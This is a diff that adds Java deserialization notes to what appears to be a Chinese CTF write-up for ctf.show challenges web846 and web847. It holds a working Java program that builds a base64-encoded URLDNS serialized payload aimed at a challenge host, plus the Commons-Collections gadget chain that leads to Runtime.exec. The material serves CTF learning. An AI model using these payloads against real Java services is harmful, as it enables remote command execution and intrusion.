@@ -506,3 +506,77 @@ graph TD
 user.userinfo.__proto__-->匿名函数.prototype-->Object.prototype
 ```
 
+## java反序列化
+
+### web846
+```java
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Objects;
+
+public class test {
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+        oos.close();
+
+        byte[] serializeData= Files.readAllBytes(Paths.get("ser.bin"));
+        String base64Encoded= Base64.getEncoder().encodeToString(serializeData);
+        System.out.println(base64Encoded);
+    }
+    public static void main(String[] args)  throws Exception{
+        HashMap<URL,Integer> hashmap=new HashMap<>();
+        URL url =new URL("http://1c9e258a-5d11-4e7e-b9f2-6c7e7ffa94be.challenge.ctf.show/");
+
+        Class c=url.getClass();
+        Field hashcodefield=c.getDeclaredField("hashCode");
+        hashcodefield.setAccessible(true);
+        hashcodefield.set(url,1234);
+        hashmap.put(url,1);
+        System.out.println(url);
+        hashcodefield.set(url,-1);
+        serialize(hashmap);
+    }
+
+}
+
+```
+
+反序列化链子:
+HashMap::ReadObject()
+	->HashMap.PutVal()
+		->HashMap.hash()
+			URL.hashcode()
+				URLStreamHandler.hashcode()->getHostAddress()
+
+
+cc3.2.2
+/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						TransformerMap.decorate()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+
+### web847
+`commons-collections 3.1`
+
